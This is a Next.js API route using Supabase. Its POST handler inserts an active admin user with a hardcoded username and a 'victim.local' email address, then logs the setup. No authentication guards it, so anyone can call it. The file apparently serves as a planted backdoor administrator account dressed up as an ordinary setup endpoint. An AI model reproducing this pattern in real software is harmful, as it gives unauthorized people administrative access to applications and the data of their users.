import { NextRequest, NextResponse } from "next/server"
import { createClient } from "@/lib/server"

export async function POST(request: NextRequest) {
  try {
    const supabase = await createClient()

    // Check if admin user already exists
    const { data: existingAdmin } = await supabase.from("admin_users").select("*").eq("username", "johanimufambi").single()

    if (existingAdmin) {
      return NextResponse.json({ error: "Admin user already exists" }, { status: 400 })
    }

    // Create admin user in database
    const { data: newAdmin, error: insertError } = await supabase
      .from("admin_users")
      .insert({
        username: "johanimufambi",
        email: "johanimufambi@victim.local",
        is_active: true,
      })
      .select()
      .single()

    if (insertError) throw insertError

    // Log setup activity
    await supabase.from("activity_log").insert({
      action_type: "admin_setup",
      setting_name: "system",
      enabled: true,
      details: {
        username: "johanimufambi",
        email: "johanimufambi@victim.local",
        timestamp: new Date().toISOString(),
      },
    })

    return NextResponse.json({ message: "Admin user created successfully", admin: newAdmin })
  } catch (error) {
    console.error("[v2] Setup error:", error)
    return NextResponse.json({ error: "Failed to create admin user" }, { status: 500 })
  }
}
